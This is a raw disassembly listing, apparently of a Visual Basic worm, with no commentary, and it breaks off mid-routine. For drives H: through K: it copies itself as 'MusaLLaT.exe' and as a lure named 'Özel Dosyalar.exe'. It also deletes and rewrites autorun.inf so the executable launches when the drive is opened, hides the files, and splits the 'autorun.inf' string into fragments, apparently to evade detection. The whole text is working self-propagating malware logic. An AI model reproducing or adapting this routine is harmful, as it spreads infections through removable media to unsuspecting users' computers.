  push 00000006h
  call [00401150h]
  add esp, 0000001Ch
  mov var_4, 00000053h
  push 004196E8h ; "H:\a"
  push 00419380h ; "ut"
  call [00401044h]
  mov edx, eax
  lea ecx, var_A4
  call [004011ACh]
  push eax
  push 0041938Ch ; "or"
  call [00401044h]
  mov edx, eax
  lea ecx, var_A8
  call [004011ACh]
  push eax
  push 00419398h ; "un."
  call [00401044h]
  mov edx, eax
  lea ecx, var_AC
  call [004011ACh]
  push eax
  push 004193A4h
  call [00401044h]
  mov edx, eax
  lea ecx, var_B0
  call [004011ACh]
  push eax
  push 004193ACh ; "nf"
  call [00401044h]
  mov edx, eax
  lea ecx, var_B4
  call [004011ACh]
  push eax
  push 00000001h
  push FFFFFFFFh
  push 00000002h
  call [0040112Ch]
  lea eax, var_B4
  push eax
  lea ecx, var_B0
  push ecx
  lea edx, var_AC
  push edx
  lea eax, var_A8
  push eax
  lea ecx, var_A4
  push ecx
  push 00000005h
  call [00401150h]
  add esp, 00000018h
  mov var_4, 00000054h
  push 00419488h ; "[AutoRun]"
  push 00000001h
  push 004194A0h
  call [004010F0h]
  add esp, 0000000Ch
  mov var_4, 00000055h
  push 004194A8h ; "Open=MusaLLaT.exe"
  push 00000001h
  push 004194A0h
  call [004010F0h]
  add esp, 0000000Ch
  mov var_4, 00000056h
  push 004194D0h ; "Shell\Open=Aç"
  push 00000001h
  push 004194A0h
  call [004010F0h]
  add esp, 0000000Ch
  mov var_4, 00000057h
  push 004194F0h ; "Shell\Open\Command=MusaLLaT.exe"
  push 00000001h
  push 004194A0h
  call [004010F0h]
  add esp, 0000000Ch
  mov var_4, 00000058h
  push 00000001h
  call [004010A0h]
  mov var_4, 00000059h
  push 00000006h
  push 00419694h ; "H:\MusaLLaT.exe"
  call [004011D0h]
  mov var_4, 0000005Ah
  push 00000006h
  push 004196E8h ; "H:\a"
  push 00419380h ; "ut"
  call [00401044h]
  mov edx, eax
  lea ecx, var_A4
  call [004011ACh]
  push eax
  push 0041938Ch ; "or"
  call [00401044h]
  mov edx, eax
  lea ecx, var_A8
  call [004011ACh]
  push eax
  push 00419398h ; "un."
  call [00401044h]
  mov edx, eax
  lea ecx, var_AC
  call [004011ACh]
  push eax
  push 004193A4h
  call [00401044h]
  mov edx, eax
  lea ecx, var_B0
  call [004011ACh]
  push eax
  push 004193ACh ; "nf"
  call [00401044h]
  mov edx, eax
  lea ecx, var_B4
  call [004011ACh]
  push eax
  call [004011D0h]
  lea edx, var_B4
  push edx
  lea eax, var_B0
  push eax
  lea ecx, var_AC
  push ecx
  lea edx, var_A8
  push edx
  lea eax, var_A4
  push eax
  push 00000005h
  call [00401150h]
  add esp, 00000018h
  mov var_4, 0000005Bh
  mov var_F8, FFFFFFFFh
  mov var_100, 0000000Bh
  lea edx, var_100
  lea ecx, var_A0
  call [00401010h]
  mov var_4, 0000005Dh
  mov var_F8, 004196F8h ; "I:\"
  mov var_100, 00000008h
  lea edx, var_100
  lea ecx, var_D0
  call [0040118Ch]
  push 00000000h
  lea ecx, var_D0
  push ecx
  call [00401120h]
  mov edx, eax
  lea ecx, var_A4
  call [004011ACh]
  push eax
  push 00418DE4h
  call [004010B0h]
  neg eax
  sbb eax, eax
  neg eax
  neg eax
  mov var_118, ax
  mov var_120, 0000000Bh
  mov var_108, 00000000h
  mov var_110, 0000800Bh
  lea edx, var_120
  push edx
  lea eax, var_30
  push eax
  lea ecx, var_110
  push ecx
  lea edx, var_E0
  push edx
  call [00401174h]
  push eax
  lea eax, var_F0
  push eax
  call [004010E4h]
  push eax
  call [00401090h]
  mov var_124, ax
  lea ecx, var_A4
  call [004011CCh]
  lea ecx, var_120
  push ecx
  lea edx, var_D0
  push edx
  push 00000002h
  call [00401024h]
  add esp, 0000000Ch
  movsx eax, var_124
  test eax, eax
  jz 0044204Dh
  mov var_4, 0000005Eh
  cmp [00460558h], 00000000h
  jnz 00441663h
  push 00460558h
  push 00418EE0h
  call [00401134h]
  mov var_248, 00460558h
  jmp 0044166Dh
  mov var_248, 00460558h
  mov ecx, var_248
  mov edx, [ecx]
  mov var_124, edx
  lea eax, var_BC
  push eax
  mov ecx, var_124
  mov edx, [ecx]
  mov eax, var_124
  push eax
  call [edx+00000014h]
  fnclex
  mov var_128, eax
  cmp var_128, 00000000h
  jge 004416C8h
  push 00000014h
  push 00418ED0h
  mov ecx, var_124
  push ecx
  mov edx, var_128
  push edx
  call [00401058h]
  mov var_24C, eax
  jmp 004416D2h
  mov var_24C, 00000000h
  mov eax, var_BC
  mov var_12C, eax
  lea ecx, var_A4
  push ecx
  mov edx, var_12C
  mov eax, [edx]
  mov ecx, var_12C
  push ecx
  call [eax+00000050h]
  fnclex
  mov var_130, eax
  cmp var_130, 00000000h
  jge 0044172Bh
  push 00000050h
  push 00418EF0h
  mov edx, var_12C
  push edx
  mov eax, var_130
  push eax
  call [00401058h]
  mov var_250, eax
  jmp 00441735h
  mov var_250, 00000000h
  cmp [00460558h], 00000000h
  jnz 0044175Ah
  push 00460558h
  push 00418EE0h
  call [00401134h]
  mov var_254, 00460558h
  jmp 00441764h
  mov var_254, 00460558h
  mov ecx, var_254
  mov edx, [ecx]
  mov var_134, edx
  lea eax, var_C0
  push eax
  mov ecx, var_134
  mov edx, [ecx]
  mov eax, var_134
  push eax
  call [edx+00000014h]
  fnclex
  mov var_138, eax
  cmp var_138, 00000000h
  jge 004417BFh
  push 00000014h
  push 00418ED0h
  mov ecx, var_134
  push ecx
  mov edx, var_138
  push edx
  call [00401058h]
  mov var_258, eax
  jmp 004417C9h
  mov var_258, 00000000h
  mov eax, var_C0
  mov var_13C, eax
  lea ecx, var_A8
  push ecx
  mov edx, var_13C
  mov eax, [edx]
  mov ecx, var_13C
  push ecx
  call [eax+00000058h]
  fnclex
  mov var_140, eax
  cmp var_140, 00000000h
  jge 00441822h
  push 00000058h
  push 00418EF0h
  mov edx, var_13C
  push edx
  mov eax, var_140
  push eax
  call [00401058h]
  mov var_25C, eax
  jmp 0044182Ch
  mov var_25C, 00000000h
  push 00419704h ; "I:\MusaLLaT.exe"
  mov ecx, var_A4
  push ecx
  push 00418DA4h ; "\"
  call [00401044h]
  mov edx, eax
  lea ecx, var_AC
  call [004011ACh]
  push eax
  mov edx, var_A8
  push edx
  call [00401044h]
  mov edx, eax
  lea ecx, var_B0
  call [004011ACh]
  push eax
  push 004192E0h ; ".exe"
  call [00401044h]
  mov edx, eax
  lea ecx, var_B4
  call [004011ACh]
  push eax
  call [00401158h]
  lea eax, var_B4
  push eax
  lea ecx, var_B0
  push ecx
  lea edx, var_A8
  push edx
  lea eax, var_AC
  push eax
  lea ecx, var_A4
  push ecx
  push 00000005h
  call [00401150h]
  add esp, 00000018h
  lea edx, var_C0
  push edx
  lea eax, var_BC
  push eax
  push 00000002h
  call [0040102Ch]
  add esp, 0000000Ch
  mov var_4, 0000005Fh
  mov var_F8, 00419728h ; "I:\Özel Dosyalar.exe"
  mov var_100, 00000008h
  lea edx, var_100
  lea ecx, var_D0
  call [0040118Ch]
  push 00000000h
  lea ecx, var_D0
  push ecx
  call [00401120h]
  mov edx, eax
  lea ecx, var_A4
  call [004011ACh]
  push eax
  push 00418DE4h
  call [004010B0h]
  neg eax
  sbb eax, eax
  neg eax
  neg eax
  mov var_118, ax
  mov var_120, 0000000Bh
  mov var_108, 00000000h
  mov var_110, 0000800Bh
  lea edx, var_120
  push edx
  lea eax, var_30
  push eax
  lea ecx, var_110
  push ecx
  lea edx, var_E0
  push edx
  call [00401174h]
  push eax
  lea eax, var_F0
  push eax
  call [004010E4h]
  push eax
  call [00401090h]
  mov var_124, ax
  lea ecx, var_A4
  call [004011CCh]
  lea ecx, var_120
  push ecx
  lea edx, var_D0
  push edx
  push 00000002h
  call [00401024h]
  add esp, 0000000Ch
  movsx eax, var_124
  test eax, eax
  jz 004419C8h
  jmp 00441C66h
  mov var_4, 00000061h
  cmp [00460558h], 00000000h
  jnz 004419F4h
  push 00460558h
  push 00418EE0h
  call [00401134h]
  mov var_260, 00460558h
  jmp 004419FEh
  mov var_260, 00460558h
  mov ecx, var_260
  mov edx, [ecx]
  mov var_124, edx
  lea eax, var_BC
  push eax
  mov ecx, var_124
  mov edx, [ecx]
  mov eax, var_124
  push eax
  call [edx+00000014h]
  fnclex
  mov var_128, eax
  cmp var_128, 00000000h
  jge 00441A59h
  push 00000014h
  push 00418ED0h
  mov ecx, var_124
  push ecx
  mov edx, var_128
  push edx
  call [00401058h]
  mov var_264, eax
  jmp 00441A63h
  mov var_264, 00000000h
  mov eax, var_BC
  mov var_12C, eax
  lea ecx, var_A4
  push ecx
  mov edx, var_12C
  mov eax, [edx]
  mov ecx, var_12C
  push ecx
  call [eax+00000050h]
  fnclex
  mov var_130, eax
  cmp var_130, 00000000h
  jge 00441ABCh
  push 00000050h
  push 00418EF0h
  mov edx, var_12C
  push edx
  mov eax, var_130
  push eax
  call [00401058h]
  mov var_268, eax
  jmp 00441AC6h
  mov var_268, 00000000h
  cmp [00460558h], 00000000h
  jnz 00441AEBh
  push 00460558h
  push 00418EE0h
  call [00401134h]
  mov var_26C, 00460558h
  jmp 00441AF5h
  mov var_26C, 00460558h
  mov ecx, var_26C
  mov edx, [ecx]
  mov var_134, edx
  lea eax, var_C0
  push eax
  mov ecx, var_134
  mov edx, [ecx]
  mov eax, var_134
  push eax
  call [edx+00000014h]
  fnclex
  mov var_138, eax
  cmp var_138, 00000000h
  jge 00441B50h
  push 00000014h
  push 00418ED0h
  mov ecx, var_134
  push ecx
  mov edx, var_138
  push edx
  call [00401058h]
  mov var_270, eax
  jmp 00441B5Ah
  mov var_270, 00000000h
  mov eax, var_C0
  mov var_13C, eax
  lea ecx, var_A8
  push ecx
  mov edx, var_13C
  mov eax, [edx]
  mov ecx, var_13C
  push ecx
  call [eax+00000058h]
  fnclex
  mov var_140, eax
  cmp var_140, 00000000h
  jge 00441BB3h
  push 00000058h
  push 00418EF0h
  mov edx, var_13C
  push edx
  mov eax, var_140
  push eax
  call [00401058h]
  mov var_274, eax
  jmp 00441BBDh
  mov var_274, 00000000h
  push 00419728h ; "I:\Özel Dosyalar.exe"
  mov ecx, var_A4
  push ecx
  push 00418DA4h ; "\"
  call [00401044h]
  mov edx, eax
  lea ecx, var_AC
  call [004011ACh]
  push eax
  mov edx, var_A8
  push edx
  call [00401044h]
  mov edx, eax
  lea ecx, var_B0
  call [004011ACh]
  push eax
  push 004192E0h ; ".exe"
  call [00401044h]
  mov edx, eax
  lea ecx, var_B4
  call [004011ACh]
  push eax
  call [00401158h]
  lea eax, var_B4
  push eax
  lea ecx, var_B0
  push ecx
  lea edx, var_A8
  push edx
  lea eax, var_AC
  push eax
  lea ecx, var_A4
  push ecx
  push 00000005h
  call [00401150h]
  add esp, 00000018h
  lea edx, var_C0
  push edx
  lea eax, var_BC
  push eax
  push 00000002h
  call [0040102Ch]
  add esp, 0000000Ch
  mov var_4, 00000063h
  push 00419758h ; "I:\a"
  push 00419380h ; "ut"
  call [00401044h]
  mov edx, eax
  lea ecx, var_A4
  call [004011ACh]
  push eax
  push 0041938Ch ; "or"
  call [00401044h]
  mov edx, eax
  lea ecx, var_A8
  call [004011ACh]
  push eax
  push 00419398h ; "un."
  call [00401044h]
  mov edx, eax
  lea ecx, var_AC
  call [004011ACh]
  push eax
  push 004193A4h
  call [00401044h]
  mov edx, eax
  lea ecx, var_B0
  call [004011ACh]
  push eax
  push 004193ACh ; "nf"
  call [00401044h]
  mov edx, eax
  lea ecx, var_B4
  call [004011ACh]
  push eax
  call [00401110h]
  lea ecx, var_B4
  push ecx
  lea edx, var_B0
  push edx
  lea eax, var_AC
  push eax
  lea ecx, var_A8
  push ecx
  lea edx, var_A4
  push edx
  push 00000005h
  call [00401150h]
  add esp, 00000018h
  mov var_4, 00000064h
  push 00419758h ; "I:\a"
  push 00419380h ; "ut"
  call [00401044h]
  mov edx, eax
  lea ecx, var_A4
  call [004011ACh]
  push eax
  push 0041938Ch ; "or"
  call [00401044h]
  mov edx, eax
  lea ecx, var_A8
  call [004011ACh]
  push eax
  push 00419398h ; "un."
  call [00401044h]
  mov edx, eax
  lea ecx, var_AC
  call [004011ACh]
  push eax
  push 004193A4h
  call [00401044h]
  mov edx, eax
  lea ecx, var_B0
  call [004011ACh]
  push eax
  push 004193ACh ; "nf"
  call [00401044h]
  mov edx, eax
  lea ecx, var_B4
  call [004011ACh]
  push eax
  lea eax, var_B8
  push eax
  call [00401188h]
  push eax
  call 00419468h ; DeleteFile(%x1v)
  call [00401054h]
  lea ecx, var_B8
  push ecx
  lea edx, var_B4
  push edx
  lea eax, var_B0
  push eax
  lea ecx, var_AC
  push ecx
  lea edx, var_A8
  push edx
  lea eax, var_A4
  push eax
  push 00000006h
  call [00401150h]
  add esp, 0000001Ch
  mov var_4, 00000065h
  push 00419758h ; "I:\a"
  push 00419380h ; "ut"
  call [00401044h]
  mov edx, eax
  lea ecx, var_A4
  call [004011ACh]
  push eax
  push 0041938Ch ; "or"
  call [00401044h]
  mov edx, eax
  lea ecx, var_A8
  call [004011ACh]
  push eax
  push 00419398h ; "un."
  call [00401044h]
  mov edx, eax
  lea ecx, var_AC
  call [004011ACh]
  push eax
  push 004193A4h
  call [00401044h]
  mov edx, eax
  lea ecx, var_B0
  call [004011ACh]
  push eax
  push 004193ACh ; "nf"
  call [00401044h]
  mov edx, eax
  lea ecx, var_B4
  call [004011ACh]
  push eax
  push 00000001h
  push FFFFFFFFh
  push 00000002h
  call [0040112Ch]
  lea ecx, var_B4
  push ecx
  lea edx, var_B0
  push edx
  lea eax, var_AC
  push eax
  lea ecx, var_A8
  push ecx
  lea edx, var_A4
  push edx
  push 00000005h
  call [00401150h]
  add esp, 00000018h
  mov var_4, 00000066h
  push 00419488h ; "[AutoRun]"
  push 00000001h
  push 004194A0h
  call [004010F0h]
  add esp, 0000000Ch
  mov var_4, 00000067h
  push 004194A8h ; "Open=MusaLLaT.exe"
  push 00000001h
  push 004194A0h
  call [004010F0h]
  add esp, 0000000Ch
  mov var_4, 00000068h
  push 004194D0h ; "Shell\Open=Aç"
  push 00000001h
  push 004194A0h
  call [004010F0h]
  add esp, 0000000Ch
  mov var_4, 00000069h
  push 004194F0h ; "Shell\Open\Command=MusaLLaT.exe"
  push 00000001h
  push 004194A0h
  call [004010F0h]
  add esp, 0000000Ch
  mov var_4, 0000006Ah
  push 00000001h
  call [004010A0h]
  mov var_4, 0000006Bh
  push 00000006h
  push 00419704h ; "I:\MusaLLaT.exe"
  call [004011D0h]
  mov var_4, 0000006Ch
  push 00000006h
  push 00419758h ; "I:\a"
  push 00419380h ; "ut"
  call [00401044h]
  mov edx, eax
  lea ecx, var_A4
  call [004011ACh]
  push eax
  push 0041938Ch ; "or"
  call [00401044h]
  mov edx, eax
  lea ecx, var_A8
  call [004011ACh]
  push eax
  push 00419398h ; "un."
  call [00401044h]
  mov edx, eax
  lea ecx, var_AC
  call [004011ACh]
  push eax
  push 004193A4h
  call [00401044h]
  mov edx, eax
  lea ecx, var_B0
  call [004011ACh]
  push eax
  push 004193ACh ; "nf"
  call [00401044h]
  mov edx, eax
  lea ecx, var_B4
  call [004011ACh]
  push eax
  call [004011D0h]
  lea eax, var_B4
  push eax
  lea ecx, var_B0
  push ecx
  lea edx, var_AC
  push edx
  lea eax, var_A8
  push eax
  lea ecx, var_A4
  push ecx
  push 00000005h
  call [00401150h]
  add esp, 00000018h
  mov var_4, 0000006Dh
  mov var_F8, FFFFFFFFh
  mov var_100, 0000000Bh
  lea edx, var_100
  lea ecx, var_30
  call [00401010h]
  mov var_4, 0000006Fh
  mov var_F8, 00419768h ; "J:\"
  mov var_100, 00000008h
  lea edx, var_100
  lea ecx, var_D0
  call [0040118Ch]
  push 00000000h
  lea edx, var_D0
  push edx
  call [00401120h]
  mov edx, eax
  lea ecx, var_A4
  call [004011ACh]
  push eax
  push 00418DE4h
  call [004010B0h]
  neg eax
  sbb eax, eax
  neg eax
  neg eax
  mov var_118, ax
  mov var_120, 0000000Bh
  mov var_108, 00000000h
  mov var_110, 0000800Bh
  lea eax, var_120
  push eax
  lea ecx, var_40
  push ecx
  lea edx, var_110
  push edx
  lea eax, var_E0
  push eax
  call [00401174h]
  push eax
  lea ecx, var_F0
  push ecx
  call [004010E4h]
  push eax
  call [00401090h]
  mov var_124, ax
  lea ecx, var_A4
  call [004011CCh]
  lea edx, var_120
  push edx
  lea eax, var_D0
  push eax
  push 00000002h
  call [00401024h]
  add esp, 0000000Ch
  movsx ecx, var_124
  test ecx, ecx
  jz 00442B55h
  mov var_4, 00000070h
  cmp [00460558h], 00000000h
  jnz 0044216Bh
  push 00460558h
  push 00418EE0h
  call [00401134h]
  mov var_278, 00460558h
  jmp 00442175h
  mov var_278, 00460558h
  mov edx, var_278
  mov eax, [edx]
  mov var_124, eax
  lea ecx, var_BC
  push ecx
  mov edx, var_124
  mov eax, [edx]
  mov ecx, var_124
  push ecx
  call [eax+00000014h]
  fnclex
  mov var_128, eax
  cmp var_128, 00000000h
  jge 004421D0h
  push 00000014h
  push 00418ED0h
  mov edx, var_124
  push edx
  mov eax, var_128
  push eax
  call [00401058h]
  mov var_27C, eax
  jmp 004421DAh
  mov var_27C, 00000000h
  mov ecx, var_BC
  mov var_12C, ecx
  lea edx, var_A4
  push edx
  mov eax, var_12C
  mov ecx, [eax]
  mov edx, var_12C
  push edx
  call [ecx+00000050h]
  fnclex
  mov var_130, eax
  cmp var_130, 00000000h
  jge 00442233h
  push 00000050h
  push 00418EF0h
  mov eax, var_12C
  push eax
  mov ecx, var_130
  push ecx
  call [00401058h]
  mov var_280, eax
  jmp 0044223Dh
  mov var_280, 00000000h
  cmp [00460558h], 00000000h
  jnz 00442262h
  push 00460558h
  push 00418EE0h
  call [00401134h]
  mov var_284, 00460558h
  jmp 0044226Ch
  mov var_284, 00460558h
  mov edx, var_284
  mov eax, [edx]
  mov var_134, eax
  lea ecx, var_C0
  push ecx
  mov edx, var_134
  mov eax, [edx]
  mov ecx, var_134
  push ecx
  call [eax+00000014h]
  fnclex
  mov var_138, eax
  cmp var_138, 00000000h
  jge 004422C7h
  push 00000014h
  push 00418ED0h
  mov edx, var_134
  push edx
  mov eax, var_138
  push eax
  call [00401058h]
  mov var_288, eax
  jmp 004422D1h
  mov var_288, 00000000h
  mov ecx, var_C0
  mov var_13C, ecx
  lea edx, var_A8
  push edx
  mov eax, var_13C
  mov ecx, [eax]
  mov edx, var_13C
  push edx
  call [ecx+00000058h]
  fnclex
  mov var_140, eax
  cmp var_140, 00000000h
  jge 0044232Ah
  push 00000058h
  push 00418EF0h
  mov eax, var_13C
  push eax
  mov ecx, var_140
  push ecx
  call [00401058h]
  mov var_28C, eax
  jmp 00442334h
  mov var_28C, 00000000h
  push 00419774h ; "J:\MusaLLaT.exe"
  mov edx, var_A4
  push edx
  push 00418DA4h ; "\"
  call [00401044h]
  mov edx, eax
  lea ecx, var_AC
  call [004011ACh]
  push eax
  mov eax, var_A8
  push eax
  call [00401044h]
  mov edx, eax
  lea ecx, var_B0
  call [004011ACh]
  push eax
  push 004192E0h ; ".exe"
  call [00401044h]
  mov edx, eax
  lea ecx, var_B4
  call [004011ACh]
  push eax
  call [00401158h]
  lea ecx, var_B4
  push ecx
  lea edx, var_B0
  push edx
  lea eax, var_A8
  push eax
  lea ecx, var_AC
  push ecx
  lea edx, var_A4
  push edx
  push 00000005h
  call [00401150h]
  add esp, 00000018h
  lea eax, var_C0
  push eax
  lea ecx, var_BC
  push ecx
  push 00000002h
  call [0040102Ch]
  add esp, 0000000Ch
  mov var_4, 00000071h
  mov var_F8, 00419798h ; "J:\Özel Dosyalar.exe"
  mov var_100, 00000008h
  lea edx, var_100
  lea ecx, var_D0
  call [0040118Ch]
  push 00000000h
  lea edx, var_D0
  push edx
  call [00401120h]
  mov edx, eax
  lea ecx, var_A4
  call [004011ACh]
  push eax
  push 00418DE4h
  call [004010B0h]
  neg eax
  sbb eax, eax
  neg eax
  neg eax
  mov var_118, ax
  mov var_120, 0000000Bh
  mov var_108, 00000000h
  mov var_110, 0000800Bh
  lea eax, var_120
  push eax
  lea ecx, var_40
  push ecx
  lea edx, var_110
  push edx
  lea eax, var_E0
  push eax
  call [00401174h]
  push eax
  lea ecx, var_F0
  push ecx
  call [004010E4h]
  push eax
  call [00401090h]
  mov var_124, ax
  lea ecx, var_A4
  call [004011CCh]
  lea edx, var_120
  push edx
  lea eax, var_D0
  push eax
  push 00000002h
  call [00401024h]
  add esp, 0000000Ch
  movsx ecx, var_124
  test ecx, ecx
  jz 004424D0h
  jmp 0044276Eh
  mov var_4, 00000073h
  cmp [00460558h], 00000000h
  jnz 004424FCh
  push 00460558h
  push 00418EE0h
  call [00401134h]
  mov var_290, 00460558h
  jmp 00442506h
  mov var_290, 00460558h
  mov edx, var_290
  mov eax, [edx]
  mov var_124, eax
  lea ecx, var_BC
  push ecx
  mov edx, var_124
  mov eax, [edx]
  mov ecx, var_124
  push ecx
  call [eax+00000014h]
  fnclex
  mov var_128, eax
  cmp var_128, 00000000h
  jge 00442561h
  push 00000014h
  push 00418ED0h
  mov edx, var_124
  push edx
  mov eax, var_128
  push eax
  call [00401058h]
  mov var_294, eax
  jmp 0044256Bh
  mov var_294, 00000000h
  mov ecx, var_BC
  mov var_12C, ecx
  lea edx, var_A4
  push edx
  mov eax, var_12C
  mov ecx, [eax]
  mov edx, var_12C
  push edx
  call [ecx+00000050h]
  fnclex
  mov var_130, eax
  cmp var_130, 00000000h
  jge 004425C4h
  push 00000050h
  push 00418EF0h
  mov eax, var_12C
  push eax
  mov ecx, var_130
  push ecx
  call [00401058h]
  mov var_298, eax
  jmp 004425CEh
  mov var_298, 00000000h
  cmp [00460558h], 00000000h
  jnz 004425F3h
  push 00460558h
  push 00418EE0h
  call [00401134h]
  mov var_29C, 00460558h
  jmp 004425FDh
  mov var_29C, 00460558h
  mov edx, var_29C
  mov eax, [edx]
  mov var_134, eax
  lea ecx, var_C0
  push ecx
  mov edx, var_134
  mov eax, [edx]
  mov ecx, var_134
  push ecx
  call [eax+00000014h]
  fnclex
  mov var_138, eax
  cmp var_138, 00000000h
  jge 00442658h
  push 00000014h
  push 00418ED0h
  mov edx, var_134
  push edx
  mov eax, var_138
  push eax
  call [00401058h]
  mov var_2A0, eax
  jmp 00442662h
  mov var_2A0, 00000000h
  mov ecx, var_C0
  mov var_13C, ecx
  lea edx, var_A8
  push edx
  mov eax, var_13C
  mov ecx, [eax]
  mov edx, var_13C
  push edx
  call [ecx+00000058h]
  fnclex
  mov var_140, eax
  cmp var_140, 00000000h
  jge 004426BBh
  push 00000058h
  push 00418EF0h
  mov eax, var_13C
  push eax
  mov ecx, var_140
  push ecx
  call [00401058h]
  mov var_2A4, eax
  jmp 004426C5h
  mov var_2A4, 00000000h
  push 00419798h ; "J:\Özel Dosyalar.exe"
  mov edx, var_A4
  push edx
  push 00418DA4h ; "\"
  call [00401044h]
  mov edx, eax
  lea ecx, var_AC
  call [004011ACh]
  push eax
  mov eax, var_A8
  push eax
  call [00401044h]
  mov edx, eax
  lea ecx, var_B0
  call [004011ACh]
  push eax
  push 004192E0h ; ".exe"
  call [00401044h]
  mov edx, eax
  lea ecx, var_B4
  call [004011ACh]
  push eax
  call [00401158h]
  lea ecx, var_B4
  push ecx
  lea edx, var_B0
  push edx
  lea eax, var_A8
  push eax
  lea ecx, var_AC
  push ecx
  lea edx, var_A4
  push edx
  push 00000005h
  call [00401150h]
  add esp, 00000018h
  lea eax, var_C0
  push eax
  lea ecx, var_BC
  push ecx
  push 00000002h
  call [0040102Ch]
  add esp, 0000000Ch
  mov var_4, 00000075h
  push 004197C8h ; "J:\a"
  push 00419380h ; "ut"
  call [00401044h]
  mov edx, eax
  lea ecx, var_A4
  call [004011ACh]
  push eax
  push 0041938Ch ; "or"
  call [00401044h]
  mov edx, eax
  lea ecx, var_A8
  call [004011ACh]
  push eax
  push 00419398h ; "un."
  call [00401044h]
  mov edx, eax
  lea ecx, var_AC
  call [004011ACh]
  push eax
  push 004193A4h
  call [00401044h]
  mov edx, eax
  lea ecx, var_B0
  call [004011ACh]
  push eax
  push 004193ACh ; "nf"
  call [00401044h]
  mov edx, eax
  lea ecx, var_B4
  call [004011ACh]
  push eax
  call [00401110h]
  lea edx, var_B4
  push edx
  lea eax, var_B0
  push eax
  lea ecx, var_AC
  push ecx
  lea edx, var_A8
  push edx
  lea eax, var_A4
  push eax
  push 00000005h
  call [00401150h]
  add esp, 00000018h
  mov var_4, 00000076h
  push 004197C8h ; "J:\a"
  push 00419380h ; "ut"
  call [00401044h]
  mov edx, eax
  lea ecx, var_A4
  call [004011ACh]
  push eax
  push 0041938Ch ; "or"
  call [00401044h]
  mov edx, eax
  lea ecx, var_A8
  call [004011ACh]
  push eax
  push 00419398h ; "un."
  call [00401044h]
  mov edx, eax
  lea ecx, var_AC
  call [004011ACh]
  push eax
  push 004193A4h
  call [00401044h]
  mov edx, eax
  lea ecx, var_B0
  call [004011ACh]
  push eax
  push 004193ACh ; "nf"
  call [00401044h]
  mov edx, eax
  lea ecx, var_B4
  call [004011ACh]
  push eax
  lea ecx, var_B8
  push ecx
  call [00401188h]
  push eax
  call 00419468h ; DeleteFile(%x1v)
  call [00401054h]
  lea edx, var_B8
  push edx
  lea eax, var_B4
  push eax
  lea ecx, var_B0
  push ecx
  lea edx, var_AC
  push edx
  lea eax, var_A8
  push eax
  lea ecx, var_A4
  push ecx
  push 00000006h
  call [00401150h]
  add esp, 0000001Ch
  mov var_4, 00000077h
  push 004197C8h ; "J:\a"
  push 00419380h ; "ut"
  call [00401044h]
  mov edx, eax
  lea ecx, var_A4
  call [004011ACh]
  push eax
  push 0041938Ch ; "or"
  call [00401044h]
  mov edx, eax
  lea ecx, var_A8
  call [004011ACh]
  push eax
  push 00419398h ; "un."
  call [00401044h]
  mov edx, eax
  lea ecx, var_AC
  call [004011ACh]
  push eax
  push 004193A4h
  call [00401044h]
  mov edx, eax
  lea ecx, var_B0
  call [004011ACh]
  push eax
  push 004193ACh ; "nf"
  call [00401044h]
  mov edx, eax
  lea ecx, var_B4
  call [004011ACh]
  push eax
  push 00000001h
  push FFFFFFFFh
  push 00000002h
  call [0040112Ch]
  lea edx, var_B4
  push edx
  lea eax, var_B0
  push eax
  lea ecx, var_AC
  push ecx
  lea edx, var_A8
  push edx
  lea eax, var_A4
  push eax
  push 00000005h
  call [00401150h]
  add esp, 00000018h
  mov var_4, 00000078h
  push 00419488h ; "[AutoRun]"
  push 00000001h
  push 004194A0h
  call [004010F0h]
  add esp, 0000000Ch
  mov var_4, 00000079h
  push 004194A8h ; "Open=MusaLLaT.exe"
  push 00000001h
  push 004194A0h
  call [004010F0h]
  add esp, 0000000Ch
  mov var_4, 0000007Ah
  push 004194D0h ; "Shell\Open=Aç"
  push 00000001h
  push 004194A0h
  call [004010F0h]
  add esp, 0000000Ch
  mov var_4, 0000007Bh
  push 004194F0h ; "Shell\Open\Command=MusaLLaT.exe"
  push 00000001h
  push 004194A0h
  call [004010F0h]
  add esp, 0000000Ch
  mov var_4, 0000007Ch
  push 00000001h
  call [004010A0h]
  mov var_4, 0000007Dh
  push 00000006h
  push 00419774h ; "J:\MusaLLaT.exe"
  call [004011D0h]
  mov var_4, 0000007Eh
  push 00000006h
  push 004197C8h ; "J:\a"
  push 00419380h ; "ut"
  call [00401044h]
  mov edx, eax
  lea ecx, var_A4
  call [004011ACh]
  push eax
  push 0041938Ch ; "or"
  call [00401044h]
  mov edx, eax
  lea ecx, var_A8
  call [004011ACh]
  push eax
  push 00419398h ; "un."
  call [00401044h]
  mov edx, eax
  lea ecx, var_AC
  call [004011ACh]
  push eax
  push 004193A4h
  call [00401044h]
  mov edx, eax
  lea ecx, var_B0
  call [004011ACh]
  push eax
  push 004193ACh ; "nf"
  call [00401044h]
  mov edx, eax
  lea ecx, var_B4
  call [004011ACh]
  push eax
  call [004011D0h]
  lea ecx, var_B4
  push ecx
  lea edx, var_B0
  push edx
  lea eax, var_AC
  push eax
  lea ecx, var_A8
  push ecx
  lea edx, var_A4
  push edx
  push 00000005h
  call [00401150h]
  add esp, 00000018h
  mov var_4, 0000007Fh
  mov var_F8, FFFFFFFFh
  mov var_100, 0000000Bh
  lea edx, var_100
  lea ecx, var_40
  call [00401010h]
  mov var_4, 00000081h
  mov var_F8, 004197D8h ; "K:\"
  mov var_100, 00000008h
  lea edx, var_100
  lea ecx, var_D0
  call [0040118Ch]
  push 00000000h
  lea eax, var_D0
  push eax
  call [00401120h]
  mov edx, eax
  lea ecx, var_A4
  call [004011ACh]
  push eax
  push 00418DE4h
  call [004010B0h]
  neg eax
  sbb eax, eax
  neg eax
  neg eax
  mov var_118, ax
  mov var_120, 0000000Bh
  mov var_108, 00000000h
  mov var_110, 0000800Bh
  lea ecx, var_120
  push ecx
  lea edx, var_50
  push edx
  lea eax, var_110
  push eax
  lea ecx, var_E0
  push ecx
  call [00401174h]
  push eax
  lea edx, var_F0
  push edx
  call [004010E4h]
  push eax
  call [00401090h]
  mov var_124, ax
  lea ecx, var_A4
  call [004011CCh]
  lea eax, var_120
  push eax
  lea ecx, var_D0
  push ecx
  push 00000002h
  call [00401024h]
  add esp, 0000000Ch
  movsx edx, var_124
  test edx, edx
  jz 0044365Dh
  mov var_4, 00000082h
  cmp [00460558h], 00000000h
  jnz 00442C73h
  push 00460558h
  push 00418EE0h
  call [00401134h]
  mov var_2A8, 00460558h
  jmp 00442C7Dh
  mov var_2A8, 00460558h
  mov eax, var_2A8
  mov ecx, [eax]
  mov var_124, ecx
  lea edx, var_BC
  push edx
  mov eax, var_124
  mov ecx, [eax]
  mov edx, var_124
  push edx
  call [ecx+00000014h]
  fnclex
